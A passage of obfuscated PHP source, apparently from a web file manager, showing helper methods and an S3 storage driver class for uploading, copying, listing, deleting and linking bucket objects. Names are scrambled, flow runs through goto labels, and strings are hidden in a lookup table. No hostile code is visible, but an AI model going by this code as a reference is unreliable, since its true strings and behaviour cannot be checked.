$dÀêñ—ÓôÈ, $dÀêñ—ÓôÈ * 10); } if (!file_exists($e„«Ó½ƒ) || filesize($e„«Ó½ƒ) < 100) { return @file_exists($Dêô‰‡ó¬°) ? IO::fileOut($Dêô‰‡ó¬°) : $this->fileOut($E†â¤¨†‰Ü); } goto E•ÅùÏ—óè; E•ÅùÏ—óè: if (!($AÑö¨ŠÏ¦‚ = IO::move($e„«Ó½ƒ, $d£™¼¨ÇÇâ))) { return IO::fileOut($e„«Ó½ƒ); } del_file($e„«Ó½ƒ); IO::fileOut($AÑö¨ŠÏ¦‚); goto aÀîá‘Ù¾â; D‰×º©õÑ—: $f§‘ä©Êß =& $_SERVER[Õİõş]; if (substr($E†â¤¨†‰Ü, 0, 4) == $f§‘ä©Êß[142]) { $this->fileOutLink($E†â¤¨†‰Ü); } $b•ÕÆÃÎŸá = $this->info($E†â¤¨†‰Ü); goto dÈ„ê–ÒÈ‹; Eµö—‰åİ´: if (!($e¬ê²ŒÂî = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $f§‘ä©Êß[161]))) { $d£™¼¨ÇÇâ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $f§‘ä©Êß[162]); } else { $d£™¼¨ÇÇâ = KodIO::make($e¬ê²ŒÂî); } if ($e¬ê²ŒÂî = IO::fileNameExist($d£™¼¨ÇÇâ, $c¢Ï‹œó„˜)) { $e„«Ó½ƒ = KodIO::make($e¬ê²ŒÂî); return IO::fileOut($e„«Ó½ƒ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto C½Î¢øÉ‚Ä; dÈ„ê–ÒÈ‹: if ($b•ÕÆÃÎŸá[$f§‘ä©Êß[77]] <= 1024 * 50 || !function_exists($f§‘ä©Êß[155]) || $b•ÕÆÃÎŸá[$f§‘ä©Êß[156]] == $f§‘ä©Êß[157]) { return $this->fileOut($E†â¤¨†‰Ü); } if (isset($b•ÕÆÃÎŸá[$f§‘ä©Êß[158]][$f§‘ä©Êß[159]])) { $cíá…ÑİÒğ = $b•ÕÆÃÎŸá[$f§‘ä©Êß[158]][$f§‘ä©Êß[159]]; } else { if (isset($b•ÕÆÃÎŸá[$f§‘ä©Êß[158]][$f§‘ä©Êß[160]])) { $cíá…ÑİÒğ = $b•ÕÆÃÎŸá[$f§‘ä©Êß[158]][$f§‘ä©Êß[160]]; } else { $cíá…ÑİÒğ = md5("{$b•ÕÆÃÎŸá[$f§‘ä©Êß[28]]}\137{$b•ÕÆÃÎŸá[$f§‘ä©Êß[75]]}\x5f{$b•ÕÆÃÎŸá[$f§‘ä©Êß[77]]}"); } } $c¢Ï‹œó„˜ = "{$cíá…ÑİÒğ}\x5f{$dÀêñ—ÓôÈ}\56\x70\x6e\147"; goto Eµö—‰åİ´; aÀîá‘Ù¾â: } public function fileOutImageServer($aªø¹¼¬ŒÌ, $e‘¿Ôäâ‚Í = 250) { $this->fileOutImage($aªø¹¼¬ŒÌ, $e‘¿Ôäâ‚Í); } public function fileNameAuto($eñÂ¥„œ»½, $Bò­ºÉÏ¿†, $bÀ­öéÊİ¯ = REPEAT_RENAME, $FÚœô¼ÇÌ = false) { goto bñÙ‹÷î; fãˆîæ‰‘İ: if ($bÀ­öéÊİ¯ == REPEAT_SKIP) { return !1; } $cõíæó°– = $fï¨ËÑÃ·’[91] . get_path_ext($Bò­ºÉÏ¿†); $cõíæó°– = $cõíæó°– == $fï¨ËÑÃ·’[91] || $FÚœô¼ÇÌ ? $fï¨ËÑÃ·’[33] : $cõíæó°–; goto dóäÂ—ğ¾©; cÇö†¿“¿±: while ($this->exist(rtrim($eñÂ¥„œ»½, $fï¨ËÑÃ·’[8]) . $fï¨ËÑÃ·’[8] . $fÉİØîöáÙ)) { $fÉİØîöáÙ = $CÇ–ß„õ•ò . "\50{$dÓë¿×¢Ş}\x29{$cõíæó°–}"; $dÓë¿×¢Ş++; } return $fÉİØîöáÙ; goto dºäãˆ§‹¡; dóäÂ—ğ¾©: $dÓë¿×¢Ş = 1; $CÇ–ß„õ•ò = substr($Bò­ºÉÏ¿†, 0, strlen($Bò­ºÉÏ¿†) - strlen($cõíæó°–)); $fÉİØîöáÙ = $CÇ–ß„õ•ò . "\x28{$dÓë¿×¢Ş}\x29{$cõíæó°–}"; goto cÇö†¿“¿±; bñÙ‹÷î: $fï¨ËÑÃ·’ =& $_SERVER[Õİõş]; $aó¡²ˆµ ƒ = $eñÂ¥„œ»½ === $fï¨ËÑÃ·’[33] ? $Bò­ºÉÏ¿† : rtrim($eñÂ¥„œ»½, $fï¨ËÑÃ·’[8]) . $fï¨ËÑÃ·’[8] . $Bò­ºÉÏ¿†; if ($bÀ­öéÊİ¯ == REPEAT_REPLACE || !$this->exist($aó¡²ˆµ ƒ) || $FÚœô¼ÇÌ && $bÀ­öéÊİ¯ != REPEAT_RENAME_FOLDER) { return $Bò­ºÉÏ¿†; } goto fãˆîæ‰‘İ; dºäãˆ§‹¡: } public function listAllFiles($EÛ³„²™, $fÄ•‹¥Ëğ¨, $a¿Ïí×­¡® = array()) { goto b÷ƒ§…äë„; A§¤‘ƒè“: foreach (array_unique($BäÎñíšªõ) as $Dçèäˆ‰Ë‘) { $E¾à µé¾Â = array($EÁ¦‡„Â[75] => $this->getPathOuter($EÁ¦‡„Â[8] . $EÛ³„²™ . $EÁ¦‡„Â[8] . $Dçèäˆ‰Ë‘), $EÁ¦‡„Â[76] => 1, $EÁ¦‡„Â[77] => 0); if (substr($Dçèäˆ‰Ë‘, -1) != $EÁ¦‡„Â[8]) { $E¾à µé¾Â[$EÁ¦‡„Â[76]] = 0; $b«ñŠÚå‰Š = $this->getPath($EÛ³„²™ . $EÁ¦‡„Â[8] . $Dçèäˆ‰Ë‘); $E¾à µé¾Â[$EÁ¦‡„Â[77]] = isset($a¿Ïí×­¡®[$b«ñŠÚå‰Š]) ? $a¿Ïí×­¡®[$b«ñŠÚå‰Š] : $this->size($b«ñŠÚå‰Š); } $CÙ‹Áƒ½”¿[] = $E¾à µé¾Â; } return $CÙ‹Áƒ½”¿; goto C‡»İß¢œõ; A’ŠƒÍ”à‹: $EÛ³„²™ = trim($EÛ³„²™, $EÁ¦‡„Â[8]); foreach ($fÄ•‹¥Ëğ¨ as $Dçèäˆ‰Ë‘) { $A¹øÁáØ = ltrim(substr($Dçèäˆ‰Ë‘, strlen($EÛ³„²™)), $EÁ¦‡„Â[8]); $BäÎñíšªõ = array_merge($BäÎñíšªõ, $this->slicePath($A¹øÁáØ)); } $CÙ‹Áƒ½”¿ = array(); goto A§¤‘ƒè“; b÷ƒ§…äë„: $EÁ¦‡„Â =& $_SERVER[Õİõş]; if (empty($fÄ•‹¥Ëğ¨)) { return array(); } $BäÎñíšªõ = array(); goto A’ŠƒÍ”à‹; C‡»İß¢œõ: } public function slicePath($A½Ğˆ§ª×) { $f¡ÚñËÃì» =& $_SERVER[Õİõş]; $EÜ”œ¶Òç = explode($f¡ÚñËÃì»[8], trim($A½Ğˆ§ª×, $f¡ÚñËÃì»[8])); $C¸Îé•„É = 0; do { ++$C¸Îé•„É; $E²‘…µÃË½[] = implode($f¡ÚñËÃì»[8], array_slice($EÜ”œ¶Òç, 0, $C¸Îé•„É)) . $f¡ÚñËÃì»[8]; } while ($C¸Îé•„É < count($EÜ”œ¶Òç)); $E²‘…µÃË½[count($EÜ”œ¶Òç) - 1] = $A½Ğˆ§ª×; return $E²‘…µÃË½; } public function getHost() { $f¾Ùó£¼ê“ =& $_SERVER[Õİõş]; $B°— ¸ñŠ‚ = parse_url(trim($this->domain, $f¾Ùó£¼ê“[8])); $c‰’Îƒ®¿İ = isset($B°— ¸ñŠ‚[$f¾Ùó£¼ê“[164]]) ? $B°— ¸ñŠ‚[$f¾Ùó£¼ê“[164]] : http_type(); $b×†äùâÒµ = isset($B°— ¸ñŠ‚[$f¾Ùó£¼ê“[165]]) ? $B°— ¸ñŠ‚[$f¾Ùó£¼ê“[165]] : $B°— ¸ñŠ‚[$f¾Ùó£¼ê“[75]]; if (isset($B°— ¸ñŠ‚[$f¾Ùó£¼ê“[166]])) { $b×†äùâÒµ .= $f¾Ùó£¼ê“[4] . $B°— ¸ñŠ‚[$f¾Ùó£¼ê“[166]]; } return $c‰’Îƒ®¿İ . $f¾Ùó£¼ê“[167] . $b×†äùâÒµ; } public function pathEncode($bößŒ í) { $bŠöÕŸîÙä =& $_SERVER[Õİõş]; return str_replace($bŠöÕŸîÙä[168], $bŠöÕŸîÙä[8], rawurlencode($bößŒ í)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($bîî…„Á´‘) { set_timeout(); require_once SDK_DIR . $_SERVER[Õİõş][169]; parent::__construct(); $this->_init($bîî…„Á´‘); } public function _init($A ³ÙÃ‡¬â) { foreach ($A ³ÙÃ‡¬â as $D›Ó·Ó®‚… => $bµªèµÊŸ) { if (isset($this->{$D›Ó·Ó®‚…})) { $this->{$D›Ó·Ó®‚…} = $bµªèµÊŸ; } } $this->endpoint = $A ³ÙÃ‡¬â[$_SERVER[Õİõş][170]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($B¨×ÔÔñÅœ = "\166\64") { $this->signVer = $B¨×ÔÔñÅœ; $this->client->setSignatureVersion($B¨×ÔÔñÅœ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto f·®³«Ñ¤; BÃã©Ëµ˜Ù: $fºÛ¦ÁÙÌÉ = array($A¡µäè®—[176], $A¡µäè®—[177], $A¡µäè®—[178], $A¡µäè®—[179], $A¡µäè®—[180]); $bÓ••ğÚñÕ = array_diff($fºÛ¦ÁÙÌÉ, $dÇ†à÷¡ÉÄ); return empty($bÓ••ğÚñÕ); goto a‡ÇÜ±Šç˜; f·®³«Ñ¤: $A¡µäè®— =& $_SERVER[Õİõş]; $ağÏ­ËÎ¤Ô = $this->getBucketCors(); if (!$ağÏ­ËÎ¤Ô || !is_array($ağÏ­ËÎ¤Ô)) { return !1; } goto E¶Åœ†”Ñ; E¶Åœ†”Ñ: if ($ağÏ­ËÎ¤Ô[$A¡µäè®—[171]] != $A¡µäè®—[172] || $ağÏ­ËÎ¤Ô[$A¡µäè®—[173]] != $A¡µäè®—[172]) { return !1; } $dÇ†à÷¡ÉÄ = array_map($A¡µäè®—[174], $ağÏ­ËÎ¤Ô[$A¡µäè®—[175]]); if (!is_array($dÇ†à÷¡ÉÄ)) { $dÇ†à÷¡ÉÄ = array(); } goto BÃã©Ëµ˜Ù; a‡ÇÜ±Šç˜: } public function mkfile($b¡íÎ³áÆÜ, $E£ÚÙĞÁ¸ò = '', $dÊ§¿‚Å = REPEAT_RENAME) { $d¢Ú‘¦¦õ… = $this->setContent($b¡íÎ³áÆÜ, $E£ÚÙĞÁ¸ò); if ($d¢Ú‘¦¦õ… !== !1) { return $this->getPathOuter($b¡íÎ³áÆÜ); } return !1; } public function mkdir($F®Êëîâğ, $c–¤È½…„Ê = REPEAT_SKIP) { if (empty($F®Êëîâğ)) { return !1; } if ($this->_isFolder($F®Êëîâğ)) { return $this->getPathOuter($F®Êëîâğ); } $b§î§Ä£³Œ = $this->setContent($F®Êëîâğ, $_SERVER[Õİõş][33], !0); if ($b§î§Ä£³Œ !== !1) { return $this->getPathOuter($F®Êëîâğ); } return !1; } public function copyFile($C×‹‡¦ šè, $EÊ à¸¿, $fêÑ­Á‡³ = array()) { $AÉôŞõ‰Í³ =& $_SERVER[Õİõş]; $fØóÆæ”Î = $this->objectMeta($C×‹‡¦ šè); if (!$fØóÆæ”Î) { return !1; } if ($fØóÆæ”Î[$AÉôŞõ‰Í³[77]] <= 1024 * 1024 * 200) { $EğïŸ©·ƒÒ = $this->client->copyObject($this->bucket, $C×‹‡¦ šè, $this->bucket, $EÊ à¸¿, $AÉôŞõ‰Í³[181], $fêÑ­Á‡³); } else { $EğïŸ©·ƒÒ = $this->client->multiCopyObject($this->bucket, $C×‹‡¦ šè, $this->bucket, $EÊ à¸¿, $fêÑ­Á‡³); } $EğïŸ©·ƒÒ = $EğïŸ©·ƒÒ ? $this->getPathOuter($EÊ à¸¿) : !1; return $EğïŸ©·ƒÒ; } public function moveFile($Cª© ªóÓ›, $d¾Ëß¢ˆ„Ù) { if ($this->copyFile($Cª© ªóÓ›, $d¾Ëß¢ˆ„Ù)) { $this->delFile($Cª© ªóÓ›); return $this->getPathOuter($d¾Ëß¢ˆ„Ù); } return !1; } public function delFile($d”­›Áï¥¹) { return $this->client->deleteObject($this->bucket, $d”­›Áï¥¹); } public function delFolder($F‚çˆÈ“õù) { goto Dõ¢¸ŸÌÍ—; cä÷—ÇâÉš: return $b¡¿“ö‘íâ === $f™ ˆĞğÇº ? !0 : !1; goto EŞÕ…°; aáÛÊ¶„ÖÖ: $b¡¿“ö‘íâ = $f™ ˆĞğÇº = 0; $e®ïìèÒ¥ = array_chunk(array_keys($C­°ÜÜè¿Ñ), 1000); foreach ($e®ïìèÒ¥ as $bÓìãå’á) { $b¡¿“ö‘íâ++; $f™ ˆĞğÇº += (int) $this->client->deleteObjects($this->bucket, $bÓìãå’á); } goto cä÷—ÇâÉš; Dõ¢¸ŸÌÍ—: $AÅˆ¾ˆø‡² =& $_SERVER[Õİõş]; $C­°ÜÜè¿Ñ = $this->listObjs($F‚çˆÈ“õù); if (!$C­°ÜÜè¿Ñ) { $F‚çˆÈ“õù = trim($F‚çˆÈ“õù, $AÅˆ¾ˆø‡²[8]); if (!empty($F‚çˆÈ“õù)) { $F‚çˆÈ“õù .= $AÅˆ¾ˆø‡²[8]; } return $this->delFile($F‚çˆÈ“õù); } goto aáÛÊ¶„ÖÖ; EŞÕ…°: } public function rename($d¯ Ø™Ğá, $aòâˆÕÓòƒ) { return $this->renameObject($d¯ Ø™Ğá, $aòâˆÕÓòƒ); } public function listPath($aù‹²² Ò, $aë‹‚šŒÕ = false) { $d·Ö®çÜõÖ =& $_SERVER[Õİõş]; $E¨ÎÔ“¾–ø = $this->listObjs($aù‹²² Ò, null, null, $d·Ö®çÜõÖ[8]); $bêíàöÁøÊ = array($d·Ö®çÜõÖ[74] => array(), $d·Ö®çÜõÖ[73] => array()); foreach ($E¨ÎÔ“¾–ø as $c«´é•Óó => $DÍîÎ®Ÿï) { if ($c«´é•Óó == $d·Ö®çÜõÖ[8]) { continue; } if (isset($DÍîÎ®Ÿï[$d·Ö®çÜõÖ[182]])) { $bêíàöÁøÊ[$d·Ö®çÜõÖ[74]][] = $this->folderInfo($DÍîÎ®Ÿï[$d·Ö®çÜõÖ[182]], $aë‹‚šŒÕ); } else { if (substr($DÍîÎ®Ÿï[$d·Ö®çÜõÖ[28]], -1) == $d·Ö®çÜõÖ[8]) { continue; } $bêíàöÁøÊ[$d·Ö®çÜõÖ[73]][] = $this->fileInfo($DÍîÎ®Ÿï[$d·Ö®çÜõÖ[28]], $aë‹‚šŒÕ, $DÍîÎ®Ÿï); } } return $bêíàöÁøÊ; } private function fileInfo($Aœ‡®ã¤òÂ, $Cù’ÇÁ£œÜ = false, $F¯ŒÇÇÅ÷Ü = array()) { goto F¡³‹¾ÂÖ; aáø§¸š¸: return $AÊªÃôÅÒÁ; goto e§¤·øŠÎğ; F¡³‹¾ÂÖ: $cï‘ôôÀ…Õ =& $_SERVER[Õİõş]; if ($Cù’ÇÁ£œÜ) { return array($cï‘ôôÀ…Õ[28] => $this->pathThis($Aœ‡®ã¤òÂ), $cï‘ôôÀ…Õ[75] => $this->getPathOuter($Aœ‡®ã¤òÂ), $cï‘ôôÀ…Õ[29] => $cï‘ôôÀ…Õ[163], $cï‘ôôÀ…Õ[156] => $this->ext($Aœ‡®ã¤òÂ), $cï‘ôôÀ…Õ[77] => isset($F¯ŒÇÇÅ÷Ü[$cï‘ôôÀ…Õ[77]]) ? $F¯ŒÇÇÅ÷Ü[$cï‘ôôÀ…Õ[77]] : 0, $cï‘ôôÀ…Õ[183] => 0, $cï‘ôôÀ…Õ[106] => 0, $cï‘ôôÀ…Õ[184] => !0, $cï‘ôôÀ…Õ[185] => !0); } $AÊªÃôÅÒÁ = array($cï‘ôôÀ…Õ[28] => $this->pathThis($Aœ‡®ã¤òÂ), $cï‘ôôÀ…Õ[75] => $this->getPathOuter($Aœ‡®ã¤òÂ), $cï‘ôôÀ…Õ[29] => $cï‘ôôÀ…Õ[163], $cï‘ôôÀ…Õ[183] => 0, $cï‘ôôÀ…Õ[106] => 0, $cï‘ôôÀ…Õ[77] => 0, $cï‘ôôÀ…Õ[156] => $this->ext($Aœ‡®ã¤òÂ), $cï‘ôôÀ…Õ[184] => !0, $cï‘ôôÀ…Õ[185] => !0); goto E£†®òŒ¼‚; E£†®òŒ¼‚: if (empty($F¯ŒÇÇÅ÷Ü)) { $F¯ŒÇÇÅ÷Ü = $this->objectMeta($Aœ‡®ã¤òÂ); if (!$F¯ŒÇÇÅ÷Ü) { return $AÊªÃôÅÒÁ; } } if (isset($F¯ŒÇÇÅ÷Ü[$cï‘ôôÀ…Õ[186]])) { $AÊªÃôÅÒÁ[$cï‘ôôÀ…Õ[106]] = $F¯ŒÇÇÅ÷Ü[$cï‘ôôÀ…Õ[186]]; } if (isset($F¯ŒÇÇÅ÷Ü[$cï‘ôôÀ…Õ[77]])) { $AÊªÃôÅÒÁ[$cï‘ôôÀ…Õ[77]] = $F¯ŒÇÇÅ÷Ü[$cï‘ôôÀ…Õ[77]]; } goto aáø§¸š¸; e§¤·øŠÎğ: } private function folderInfo($Få¨Î›¦¢ä, $Bó£ØŒ×î = false) { goto D’ìª¨í¡’; AªÙ¾ò‹À: if ($Få¨Î›¦¢ä == $f¡‚‰Ä´°ë[33]) { return $D¥­ÊÛèÑœ; } $Få¨Î›¦¢ä = trim($Få¨Î›¦¢ä, $f¡‚‰Ä´°ë[8]) . $f¡‚‰Ä´°ë[8]; $AÕò¹ÂóÕ» = $this->objectMeta($Få¨Î›¦¢ä); goto fšªÅÂÕ–¦; fšªÅÂÕ–¦: if (isset($AÕò¹ÂóÕ»[$f¡‚‰Ä´°ë[186]])) { $D¥­ÊÛèÑœ[$f¡‚‰Ä´°ë[183]] = $AÕò¹ÂóÕ»[$f¡‚‰Ä´°ë[186]]; } return $D¥­ÊÛèÑœ; goto DİÊİ‡¿·Â; D’ìª¨í¡’: $f¡‚‰Ä´°ë =& $_SERVER[Õİõş]; if ($Bó£ØŒ×î) { return array($f¡‚‰Ä´°ë[28] => $this->pathThis($Få¨Î›¦¢ä), $f¡‚‰Ä´°ë[75] => $this->getPathOuter($f¡‚‰Ä´°ë[8] . $Få¨Î›¦¢ä), $f¡‚‰Ä´°ë[29] => $f¡‚‰Ä´°ë[76], $f¡‚‰Ä´°ë[184] => !0, $f¡‚‰Ä´°ë[185] => !0); } $D¥­ÊÛèÑœ = array($f¡‚‰Ä´°ë[28] => $this->pathThis($Få¨Î›¦¢ä), $f¡‚‰Ä´°ë[75] => $this->getPathOuter($f¡‚‰Ä´°ë[8] . $Få¨Î›¦¢ä), $f¡‚‰Ä´°ë[29] => $f¡‚‰Ä´°ë[76], $f¡‚‰Ä´°ë[183] => 0, $f¡‚‰Ä´°ë[106] => 0, $f¡‚‰Ä´°ë[184] => !0, $f¡‚‰Ä´°ë[185] => !0); goto AªÙ¾ò‹À; DİÊİ‡¿·Â: } public function listObjs($FÁãàÓ†Œº, $EÚô„–ƒ‚Ó = null, $F³…ÔÑ› = null, $AèéÔ³·¡õ = null) { $D¦ã¢Ñ¦ö =& $_SERVER[Õİõş]; $FÁãàÓ†Œº = trim($FÁãàÓ†Œº, $D¦ã¢Ñ¦ö[8]); $bé÷´ÜÅ¤ = empty($FÁãàÓ†Œº) ? $D¦ã¢Ñ¦ö[33] : $FÁãàÓ†Œº . $D¦ã¢Ñ¦ö[8]; return $this->client->getBucket($this->bucket, $bé÷´ÜÅ¤, $EÚô„–ƒ‚Ó, $F³…ÔÑ›, $AèéÔ³·¡õ, !0); } public function has($fÉ†…õ–íŸ, $D¤ìÄÆ´Ë÷ = false, $cÓ©‘¡‚‰ó = true) { goto bïç£÷’ê; Dëî“ƒˆ›„: $aŠ£Ã¯Ş”Î = $this->listObjs($fÉ†…õ–íŸ, null, null, $d‰¶í•µÕ[8]); $aŠ£Ã¯Ş”Î = is_array($aŠ£Ã¯Ş”Î) ? $aŠ£Ã¯Ş”Î : array(); foreach ($aŠ£Ã¯Ş”Î as $fšÌ‹“¯ê) { if (isset($fšÌ‹“¯ê[$d‰¶í•µÕ[28]]) && substr($fšÌ‹“¯ê[$d‰¶í•µÕ[28]], -1) != $d‰¶í•µÕ[8]) { if (!$D¤ìÄÆ´Ë÷ && $cÓ©‘¡‚‰ó) { return !0; } $B‚”¡Æ«×ğ++; } else { if (isset($fšÌ‹“¯ê[$d‰¶í•µÕ[182]])) { if (!$D¤ìÄÆ´Ë÷ && !$cÓ©‘¡‚‰ó) { return !1; } $Aì²áÀ¶¯++; } } } goto bÁ¨é²©’Ö; bïç£÷’ê: $d‰¶í•µÕ =& $_SERVER[Õİõş]; $B‚”¡Æ«×ğ = 0; $Aì²áÀ¶¯ = 0; goto Dëî“ƒˆ›„; bÁ¨é²©’Ö: if ($D¤ìÄÆ´Ë÷) { return array($d‰¶í•µÕ[187] => $B‚”¡Æ«×ğ, $d‰¶í•µÕ[188] => $Aì²áÀ¶¯); } return !1; goto DìêºÊÚ ë; DìêºÊÚ ë: } public function listAll($aÔ›®æ»Æ•) { $CÌ®ßÌÍ†¿ =& $_SERVER[Õİõş]; $bĞ¤…Ê›ô  = $this->listObjs($aÔ›®æ»Æ•); $fªëÙ˜Ø  = $BŒğªÈäÏ = array(); foreach ($bĞ¤…Ê›ô  as $c­ÓèŸãµ => $A¿ÍææÔŒ‚) { $fªëÙ˜Ø [] = $A¿ÍææÔŒ‚[$CÌ®ßÌÍ†¿[28]]; $BŒğªÈäÏ[$c­ÓèŸãµ] = $A¿ÍææÔŒ‚[$CÌ®ßÌÍ†¿[77]]; } return $this->listAllFiles($aÔ›®æ»Æ•, $fªëÙ˜Ø , $BŒğªÈäÏ); } public function canRead($BÂ¼Á›¶Ç) { $dìáºŒØæÑ =& $_SERVER[Õİõş]; $E‚ùÏ®äëë = $this->client->getAccessControlPolicy($this->bucket, $BÂ¼Á›¶Ç); if (!$E‚ùÏ®äëë) { return !1; } return in_array($E‚ùÏ®äëë, array($dìáºŒØæÑ[189], $dìáºŒØæÑ[190], $dìáºŒØæÑ[191])) ? !0 : !1; } public function canWrite($c»ŞÃÔ‘à) { $EµºÇ”ê =& $_SERVER[Õİõş]; $d¯›«ˆ·®ä = $this->client->getAccessControlPolicy($this->bucket, $c»ŞÃÔ‘à); if (!$d¯›«ˆ·®ä) { return !1; } return in_array($d¯›«ˆ·®ä, array($EµºÇ”ê[189], $EµºÇ”ê[190])) ? !0 : !1; } public function getContent($cÀ”·¯ïø¯) { return $this->client->getObject($this->bucket, $cÀ”·¯ïø¯); } public function setContent($fßŒİÊ‹ğ‡, $BÌ¯˜Šéƒæ = '', $a §–æ‘é· = false) { goto c‡¶È¹ÄÂ; Fƒ“Íù²Ş: $AÚË÷ŠÙ = $this->copyFile($fßŒİÊ‹ğ‡, $fßŒİÊ‹ğ‡, array($d˜å½åô‡¢[192] => $AÚË÷ŠÙ[$d˜å½åô‡¢[193]])); return $AÚË÷ŠÙ ? !0 : !1; goto b¯©´¶£Ğ¬; F¸Î‘òÌè: $AÚË÷ŠÙ = $this->client->putObject($BÌ¯˜Šéƒæ, $this->bucket, $fßŒİÊ‹ğ‡, $d˜å½åô‡¢[181], array(), $A•®‘Ëùø); if (!$AÚË÷ŠÙ) { return !1; } if ($a §–æ‘é·) { return !0; } goto Fƒ“Íù²Ş; c‡¶È¹ÄÂ: $d˜å½åô‡¢ =& $_SERVER[Õİõş]; $fßŒİÊ‹ğ‡ = $a §–æ‘é· ? trim($fßŒİÊ‹ğ‡, $d˜å½åô‡¢[8]) . $d˜å½åô‡¢[8] : $fßŒİÊ‹ğ‡; $A•®‘Ëùø = get_file_mime(get_path_ext($fßŒİÊ‹ğ‡)); goto F¸Î‘òÌè; b¯©´¶£Ğ¬: } public function fileSubstr($fŞ“¥ßŒ‰, $eÊ’§¾Õƒø, $DÇîÅÉòŠ) { $A¦Ä‰ÒÙÛÛ = $eÊ’§¾Õƒø + $DÇîÅÉòŠ - 1; return $this->client->getObject($this->bucket, $fŞ“¥ßŒ‰, array($_SERVER[Õİõş][194] => "\x62\x79\164\x65\x73\75{$eÊ’§¾Õƒø}\x2d{$A¦Ä‰ÒÙÛÛ}")); } public function upload($DÍ½§ùøôæ, $a™¤ø˜­²Ñ, $aÕØ›Íºçê = false, $Aˆ¡Úæœ‚ = REPEAT_REPLACE) { $E¨¨âñ”’‡ =& $_SERVER[Õİõş]; $Bßè²˜Æ–ã = array($E¨¨âñ”’‡[192] => @md5_file($a™¤ø˜­²Ñ)); $D¶Æ¸†óƒ¢ = array($E¨¨âñ”’‡[195] => get_file_mime(get_path_ext($DÍ½§ùøôæ))); if (IO::size($a™¤ø˜­²Ñ) <= 1024 * 1024 * 200) { $e†ÊŠÔ° = $this->client->putObjectFile($a™¤ø˜­²Ñ, $this->bucket, $DÍ½§ùøôæ, $E¨¨âñ”’‡[181], $Bßè²˜Æ–ã, $D¶Æ¸†óƒ¢); return !empty($e†ÊŠÔ°) ? $this->getPathOuter($DÍ½§ùøôæ) : !1; } $f¨¸Ğà¸£÷ = $this->client->multiUploadObject($a™¤ø˜­²Ñ, $this->bucket, trim($DÍ½§ùøôæ, $E¨¨âñ”’‡[8]), $Bßè²˜Æ–ã, $D¶Æ¸†óƒ¢); return $f¨¸Ğà¸£÷ ? $this->getPathOuter($DÍ½§ùøôæ) : !1; } public function download($cÔ¿õÜàê›, $BÛù×¨¶ê) { if (!@is_dir($this->pathFather($BÛù×¨¶ê)) && !IO::mkdir($this->pathFather($BÛù×¨¶ê))) { return !1; } $A¦ª£Ÿ˜¥ = $this->client->getObject($this->bucket, $cÔ¿õÜàê›, array(), $BÛù×¨¶ê); return $A¦ª£Ÿ˜¥ !== !1 ? $BÛù×¨¶ê : !1; } public function link($C¶çî±ìÉµ, $AÜã³Ç¨¢  = array()) { $F˜ÅÂ´« =& $_SERVER[Õİõş]; if ($this->signVer == $F˜ÅÂ´«[196]) { return $this->client->getAuthenticatedURL($this->bucket, $C¶çî±ìÉµ, 3600 * 12, $AÜã³Ç¨¢ ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($C¶çî±ìÉµ, $F˜ÅÂ´«[8]), 3600 * 12, $this->region, array(), !0, $AÜã³Ç¨¢ ); } public function fileOut($Cñá·¿‰¶ğ, $aŒß™¹™ = false, $F¶Ï¯Ûï‚¼ = false, $d‘ ®èğï» = '') { goto aè‰°°ğ˜â; Cì‚ã­ô¢÷: if ($EÖù“¿óÆè == $aÚØˆ˜ùÓ¼[197]) { return parent::fileOut($Cñá·¿‰¶ğ, $aŒß™¹™, $F¶Ï¯Ûï‚¼, $d‘ ®èğï»); } $aŒß™¹™ = $aŒß™¹™ ? $aÚØˆ˜ùÓ¼[198] : $aÚØˆ˜ùÓ¼[199]; $cŞÌµÁ¾Æ© = array($aÚØˆ˜ùÓ¼[200] => $aŒß™¹™ . $aÚØˆ˜ùÓ¼[201] . rawurlencode($F¶Ï¯Ûï‚¼), $aÚØˆ˜ùÓ¼[202] => $EÖù“¿óÆè); goto Fí¹¨Š‘½Ã; aè‰°°ğ˜â: $aÚØˆ˜ùÓ¼ =& $_SERVER[Õİõş]; if (!$F¶Ï¯Ûï‚¼) { $F¶Ï¯Ûï‚¼ = $this->pathThis($Cñá·¿‰¶ğ); } $EÖù“¿óÆè = get_file_mime(get_path_ext($F¶Ï¯Ûï‚¼)); goto Cì‚ã­ô¢÷; Fí¹¨Š‘½Ã: $bšîã•ƒÉ‡ = $this->link($Cñá·¿‰¶ğ, $cŞÌµÁ¾Æ©); $this->fileOutLink($bšîã•ƒÉ‡); goto F‡Î±•æ­ì; F‡Î±•æ­ì: } public function fileOutServer($A¤ßÑ–ÏÑ, $a‹è¤ÜÁñ = false, $fŸ¥‰ŠËğˆ = false, $D™¸å¶É§ø = '') { parent::fileOut($A¤ßÑ–ÏÑ, $a‹è¤ÜÁñ, $fŸ¥‰ŠËğˆ, $D™¸å¶É§ø); } public function fileOutImage($B±Ø¢ÖÎ, $fÄ»½«Ä…Õ = 250) { $aÙÍÕ‚„ÍÇ = $this->link($B±Ø¢ÖÎ); $this->fileOutLink($aÙÍÕ‚„ÍÇ); } public function fileOutImageServer($EŠÕ˜‰²¡Ü, $ašµÑ£‡É = 250) { parent::fileOutImage($EŠÕ˜‰²¡Ü, $ašµÑ£‡É); } public function hashMd5($bÙ”•ÏªñŠ, $FÔ±ÓÇ©Í· = '') { $BÜ™İÚŒÄ‹ =& $_SERVER[Õİõş]; $b¼İæÓ›ë‡ = $this->objectMeta($bÙ”•ÏªñŠ); if (!$b¼İæÓ›ë‡) { return !1; } $FÔ±ÓÇ©Í· = $FÔ±ÓÇ©Í· ? $FÔ±ÓÇ©Í· : _get($b¼İæÓ›ë‡, $BÜ™İÚŒÄ‹[203]); $FÔ±ÓÇ©Í· = $FÔ±ÓÇ©Í· ? $FÔ±ÓÇ©Í· : _get($b¼İæÓ›ë‡, $BÜ™İÚŒÄ‹[193], $BÜ™İÚŒÄ‹[33]); return 